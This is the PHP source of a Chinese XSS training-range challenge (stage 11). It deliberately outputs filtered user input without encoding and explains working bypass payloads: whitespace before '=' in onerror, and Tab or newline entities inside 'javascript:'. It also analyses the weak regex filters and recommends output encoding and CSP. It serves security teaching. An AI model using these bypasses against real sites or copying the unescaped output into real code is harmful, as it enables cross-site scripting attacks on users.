<?php
/**
 * XSS Challenges - Stage #11
 * 14.7 绕过多条正则过滤规则
 *
 * 漏洞成因：
 *   服务端使用三条正则规则过滤：
 *   1. s/script/xscript/ig — 将 script 替换为 xscript
 *   2. s/on[a-z]+=/onxxx=/ig — 将 on+字母+= 替换为 onxxx=
 *   3. s/style=/stxxx=/ig — 将 style= 替换为 stxxx=
 *   输出位置在 input 的 value 属性（有双引号包裹，使用 htmlspecialchars）
 *   但搜索结果 <b> 标签中直接输出 $filtered，无 HTML 编码
 *
 * 通关 Payload（空格绕过 on 事件属性）：
 *   <img src=x onerror =alert(document.domain)>
 *   或 <img src=x onerror	=alert(document.domain)>（Tab绕过）
 *
 * 通关 Payload（javascript: 控制字符绕过）：
 *   xuegod"><a href="javas&#09;cript:alert(document.domain);">xss</a>
 *   xuegod"><a href="javas&NewLine;cript:alert(document.domain);">xss</a>
 *
 * 说明：
 *   - 规则 /on[a-z]+=/i 要求字母与 = 紧邻，HTML 允许空白字符
 *   - 规则 /script/i 匹配连续的 "script"，但 javascript: 协议中可插入控制字符
 *   - 双写绕过在此关无效（替换为非空字符串，无法还原关键字）
 */

// 获取参数
$p1 = isset($_GET['p1']) ? $_GET['p1'] : '';
$searched = isset($_GET['p1']);
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <title>XSS Challenges - Stage #11</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
<header>
  <a class="logo" href="../../index.php">极客事纪 XSS<span>·</span>Challenges靶场</a>
  <nav><a href="../../index.php">首页</a></nav>
</header>

<div class="stage-banner">
  <span class="stage-badge">STAGE #11</span>
  <h1>绕过过滤script和on关键字</h1>
  <span class="difficulty">难度：★★★★☆ 高级</span>
</div>

<main>
  <div class="task-card">
    <h2>任务目标</h2>
    <p>在搜索框中注入 XSS 代码，使页面弹出 <code>alert</code> 对话框，内容显示当前页面的 <strong>document.domain</strong>。<br>表单参数名为 <code style="color:#e94560;">p1</code>，通过 GET 方式提交。</p>
    <div class="hint">💡 提示（选中以下文字查看）：<span class="hint-content">"s/script/xscript/ig;" and "s/on[a-z]+=/onxxx=/ig;" and "s/style=/stxxx=/ig;"</span></div>
  </div>

  <div class="lab-area">
    <h2>🔍 靶场第十一关</h2>
    <?php if ($searched): ?>
    <div class="url-bar">GET <?php echo htmlspecialchars($_SERVER['PHP_SELF'], ENT_QUOTES, 'UTF-8'); ?>?<span class="url-key">p1</span>=<span class="url-val"><?php echo htmlspecialchars($p1, ENT_QUOTES, 'UTF-8'); ?></span></div>
    <?php endif; ?>
    <?php
    // 三条正则过滤规则（不区分大小写）
    $filtered = $p1;
    $filtered = preg_replace('/script/i', 'xscript', $filtered);
    $filtered = preg_replace('/on[a-z]+=/i', 'onxxx=', $filtered);
    $filtered = preg_replace('/style=/i', 'stxxx=', $filtered);
    ?>
    <form class="search-form" method="GET" action="">
      <input type="text" name="p1" value="<?php echo htmlspecialchars($filtered, ENT_QUOTES, 'UTF-8'); ?>" />
      <button type="submit">搜索</button>
    </form>
    <div class="result-area">
      <div class="result-label">搜索结果</div>
      <div class="result-text">
        <?php if ($searched): ?><b><?php echo $filtered; ?></b><?php else: ?><span class="result-empty">暂无搜索记录</span><?php endif; ?>
      </div>
    </div>
  </div>

  <div class="knowledge-section">
    <button class="knowledge-toggle" onclick="this.parentElement.classList.toggle('expanded')">
      <span class="toggle-icon">▶</span> 知识点解析
    </button>
    <div class="knowledge-content">

    <div class="knowledge-item">
      <h3>后端 PHP 漏洞代码</h3>
      <p>本关服务端使用了三条正则过滤规则：</p>
      <div class="code-block"><span class="hl-comment">// 获取 GET 参数 p1</span>
<span class="hl-var">$p1</span> = <span class="hl-php">isset</span>(<span class="hl-var">$_GET</span>[<span class="hl-str">'p1'</span>]) ? <span class="hl-var">$_GET</span>[<span class="hl-str">'p1'</span>] : <span class="hl-str">''</span>;

<span class="hl-comment">// 规则1：s/script/xscript/ig — 替换为非空字符串</span>
<span class="hl-var">$filtered</span> = <span class="hl-fn">preg_replace</span>(<span class="hl-str">'/script/i'</span>, <span class="hl-str">'xscript'</span>, <span class="hl-var">$p1</span>);

<span class="hl-comment">// 规则2：s/on[a-z]+=/onxxx=/ig — 事件属性赋值被替换</span>
<span class="hl-var">$filtered</span> = <span class="hl-fn">preg_replace</span>(<span class="hl-str">'/on[a-z]+=/i'</span>, <span class="hl-str">'onxxx='</span>, <span class="hl-var">$filtered</span>);

<span class="hl-comment">// 规则3：s/style=/stxxx=/ig — 内联样式被替换</span>
<span class="hl-var">$filtered</span> = <span class="hl-fn">preg_replace</span>(<span class="hl-str">'/style=/i'</span>, <span class="hl-str">'stxxx='</span>, <span class="hl-var">$filtered</span>);</div>
      <p>三条规则均使用 <code>/i</code> 标志（不区分大小写），封锁了标签注入、事件属性注入和内联样式注入三条路径。</p>
      <p>输出位置分析：</p>
      <div class="code-block"><span class="hl-comment">// 位置1：input 的 value 属性（使用了 htmlspecialchars，安全 ✅）</span>
<span class="hl-tag">&lt;input</span> <span class="hl-attr">value</span>=<span class="hl-val">"&lt;?php echo htmlspecialchars($filtered); ?&gt;"</span> <span class="hl-tag">/&gt;</span>

<span class="hl-comment">// 位置2：搜索结果的 &lt;b&gt; 标签内（直接输出，无编码，漏洞在这里 ❌）</span>
<span class="hl-tag">&lt;b&gt;</span><span class="hl-inject">&lt;?php echo $filtered; ?&gt;</span><span class="hl-tag">&lt;/b&gt;</span></div>
    </div>

    <div class="knowledge-item">
      <h3>分析：为什么双写绕过失效了？</h3>
      <p>第十关中 <code>str_replace('domain', '', ...)</code> 将关键字替换为<strong>空字符串</strong>，双写后可以还原。但本关将关键字替换为<strong>非空字符串</strong>：</p>
      <div class="code-block"><span class="hl-comment">// 第十关：替换为空（双写可还原）</span>
<span class="hl-var">$r</span> = <span class="hl-php">str_replace</span>(<span class="hl-str">'domain'</span>, <span class="hl-str">''</span>, <span class="hl-str">'domdomainain'</span>);
<span class="hl-comment">// dom[domain被删]ain → "domain" ✅ 还原成功</span>

<span class="hl-comment">// 本关：替换为非空（双写无法还原）</span>
<span class="hl-var">$r</span> = <span class="hl-fn">preg_replace</span>(<span class="hl-str">'/script/i'</span>, <span class="hl-str">'xscript'</span>, <span class="hl-str">'sscriptipt'</span>);
<span class="hl-comment">// s[script→xscript]ipt → "sxscriptipt" ❌ 标签名被破坏</span></div>
      <p>核心区别：替换为空字符串时，嵌入的关键字被删除后剩余字符自然拼合；替换为非空字符串时，会多出额外字符，无法还原为有效关键字。</p>
      <p>同样，对 <code>/on[a-z]+=/i</code> 双写也不可行：</p>
      <div class="code-block"><span class="hl-comment">// 双写 onerror=：输入 "ononerror="</span>
<span class="hl-comment">// 正则匹配整个 "ononerror="（on + 字母 onerror + =）</span>
<span class="hl-comment">// 替换为 "onxxx="，事件属性完全被破坏</span></div>
      <p>大小写混合也不可行——三条规则都使用了 <code>/i</code> 标志，不区分大小写。</p>
    </div>

    <div class="knowledge-item">
      <h3>例1：HTML 空白字符绕过 on 事件属性过滤</h3>
      <p>仔细观察规则2的正则： <code>/on[a-z]+=/i</code>。它要求字母和 <code>=</code> <strong>紧邻</strong>。但 HTML 规范允许属性名和 <code>=</code> 号之间出现<strong>空白字符</strong>（空格、Tab、换行等），浏览器仍然能正确解析。</p>
      <p>Payload 构造：</p>
      <div class="code-block">stage11.php?p1=<span class="hl-inject">&lt;img src=x onerror =alert(document.domain)&gt;</span></div>
      <p>服务端过滤过程：</p>
      <div class="code-block"><span class="hl-comment">// 规则1 /script/i：无匹配 ✅</span>
<span class="hl-comment">// 规则2 /on[a-z]+=/i：onerror 后有空格，"onerror " 不匹配（无紧邻的 =）✅</span>
<span class="hl-comment">// 规则3 /style=/i：无匹配 ✅</span>
<span class="hl-comment">// 结果：&lt;img src=x onerror =alert(document.domain)&gt; ✅ 三条规则全部绕过</span></div>
      <p>浏览器解析时，<code>onerror</code> 和 <code>=</code> 之间的空格被忽略，<code>onerror</code> 仍被识别为有效事件属性。图片 <code>src=x</code> 加载失败后自动触发 <code>alert(document.domain)</code>。</p>
    </div>

    <div class="knowledge-item">
      <h3>例2：其他空白字符同样有效</h3>
      <p>除了空格，HTML 还允许 Tab、换行符、回车符等空白字符出现在属性名和 <code>=</code> 之间：</p>
      <div class="code-block"><span class="hl-comment">// Tab 制表符绕过</span>
<span class="hl-val">&lt;img src=x onerror	=alert(document.domain)&gt;</span>

<span class="hl-comment">// 换行符绕过</span>
<span class="hl-val">&lt;img src=x onerror
=alert(document.domain)&gt;</span>

<span class="hl-comment">// 多个空格绕过</span>
<span class="hl-val">&lt;img src=x onerror  =alert(document.domain)&gt;</span></div>
      <p>这些方式都能绕过 <code>/on[a-z]+=/i</code> 的匹配，因为正则的 <code>[a-z]+</code> 只匹配字母，不匹配空白字符。</p>
    </div>

    <div class="knowledge-item">
      <h3>例3：javascript: 协议中的控制字符绕过</h3>
      <p>规则1 <code>/script/i</code> 过滤了字符串 <code>script</code>，但浏览器在解析 <code>href</code> 属性中的 <code>javascript:</code> 协议时，会<strong>忽略某些控制字符</strong>。我们可以在 <code>script</code> 内部插入控制字符来破坏正则匹配：</p>
      <p>Payload 构造：</p>
      <div class="code-block"><span class="hl-comment">// 方法1：使用 Tab（&#09;）分割 script</span>
stage11.php?p1=<span class="hl-inject">xuegod"&gt;&lt;a href="javas&#09;cript:alert(document.domain);"&gt;xss&lt;/a&gt;</span>

<span class="hl-comment">// 方法2：使用换行符（&amp;NewLine;）分割 script</span>
stage11.php?p1=<span class="hl-inject">xuegod"&gt;&lt;a href="javas&amp;NewLine;cript:alert(document.domain);"&gt;xss&lt;/a&gt;</span></div>
      <p>服务端过滤过程（以 Tab 为例）：</p>
      <div class="code-block"><span class="hl-comment">// 输入：xuegod"&gt;&lt;a href="javas[TAB]cript:alert(document.domain);"&gt;xss&lt;/a&gt;</span>
<span class="hl-comment">// 规则1 /script/i：字符串中不包含连续的 "script"，"javas\tcript" 不匹配 ✅</span>
<span class="hl-comment">// 规则2 /on[a-z]+=/i：无 on 事件属性 ✅</span>
<span class="hl-comment">// 规则3 /style=/i：无 style 属性 ✅</span>
<span class="hl-comment">// 结果：xuegod"&gt;&lt;a href="javas\tcript:alert(document.domain);"&gt;xss&lt;/a&gt;</span></div>
      <p>浏览器解析时，<code>javas[TAB]cript:</code> 中的 Tab 字符被忽略，等价于 <code>javascript:</code> 协议。用户点击链接后执行 <code>alert(document.domain)</code>。</p>
      <p>payload 中 <code>xuegod"&gt;</code> 的作用：先闭合搜索框 input 的 value 属性的双引号，再闭合 input 标签，然后在 <code>&lt;b&gt;</code> 容器内注入新的 <code>&lt;a&gt;</code> 标签。</p>
      <p>可用的控制字符包括：</p>
      <div class="code-block"><span class="hl-comment">// HTML 实体编码 — 十进制</span>
<span class="hl-val">&amp;#09;  </span> <span class="hl-comment">// Tab 制表符（\t）</span>
<span class="hl-val">&amp;#10;  </span> <span class="hl-comment">// 换行符（\n）</span>
<span class="hl-val">&amp;#13;  </span> <span class="hl-comment">// 回车符（\r）</span>

<span class="hl-comment">// HTML 实体编码 — 十六进制</span>
<span class="hl-val">&amp;#x09;  </span> <span class="hl-comment">// Tab 制表符（\t）</span>
<span class="hl-val">&amp;#x0A;  </span> <span class="hl-comment">// 换行符（\n）</span>
<span class="hl-val">&amp;#x0D;  </span> <span class="hl-comment">// 回车符（\r）</span>

<span class="hl-comment">// 命名实体形式</span>
<span class="hl-val">&amp;Tab;     </span> <span class="hl-comment">// Tab 制表符</span>
<span class="hl-val">&amp;NewLine; </span> <span class="hl-comment">// 换行符</span></div>
      <p>这些控制字符在 URL 协议名中会被浏览器静默忽略，但它们的存在会阻止正则 <code>/script/i</code> 的匹配，从而绕过过滤。</p>
    </div>

    <div class="knowledge-item">
      <h3>规则设计缺陷分析</h3>
      <p>本关三条规则的设计存在一个共同问题——<strong>正则没有考虑 HTML 语法的宽松性</strong>：</p>
      <div class="code-block"><span class="hl-comment">// 规则1缺陷：/script/i 只匹配固定字符串</span>
<span class="hl-comment">//   但 HTML 标签名不区分大小写（已被 /i 覆盖）</span>
<span class="hl-comment">//   替换为 "xscript" 虽然破坏了标签名，但方向正确</span>

<span class="hl-comment">// 规则2缺陷：/on[a-z]+=/i 要求 = 紧跟字母</span>
<span class="hl-comment">//   但 HTML 允许 onerror =（有空格）</span>
<span class="hl-comment">//   正确写法应为：/on[a-z]+\s*=/i（\s* 匹配零个或多个空白字符）</span>

<span class="hl-comment">// 规则3缺陷：/style=/i 同样不处理空白字符</span>
<span class="hl-comment">//   正确写法应为：/style\s*=/i</span></div>
      <p>对比第十关和本关的防御思路：</p>
      <div class="code-block"><span class="hl-comment">// 第十关：str_replace('domain', '', ...) — 替换为空，双写可绕过</span>
<span class="hl-comment">// 本关：  preg_replace('/script/i', 'xscript', ...) — 替换为非空，双写失效</span>
<span class="hl-comment">//         但正则本身未考虑 HTML 语法，空白字符可绕过</span></div>
    </div>

    <div class="knowledge-item">
      <h3>互动思考 💬</h3>
      <p><strong>问：</strong>如果服务端将规则2修正为 <code>/on[a-z]+\s*=/i</code>（用 <code>\s*</code> 匹配可选空白），并删除 URL 中的控制字符，这些绕过方式还有效吗？</p>
      <p><strong>答：</strong>上述绕过将全部失效。但随着正则越来越复杂，总有遗漏的边界情况。最可靠的防御方式<strong>不是在黑名单上不断修补</strong>，而是从根源上解决问题：</p>
      <ul>
        <li>对输出进行 <code>htmlspecialchars()</code> 编码，将所有 HTML 特殊字符转义为实体</li>
        <li>设置 CSP（Content-Security-Policy）头，禁止内联脚本和内联事件处理器</li>
        <li>使用白名单验证，只允许安全的字符通过</li>
      </ul>
      <p>本关的核心教训：<strong>用正则做 HTML 输入过滤是非常脆弱的</strong>。HTML 语法非常宽松，正则很难穷举所有合法变体。安全的做法是<strong>对输出统一编码</strong>，而非对输入逐一过滤。</p>
    </div>
    </div>
  </div>
</main>

<footer> 极客事纪 XSS Challenges靶场 &nbsp;·&nbsp; 仅供 <span>安全学习</span> 使用 </footer>
</body>
</html>
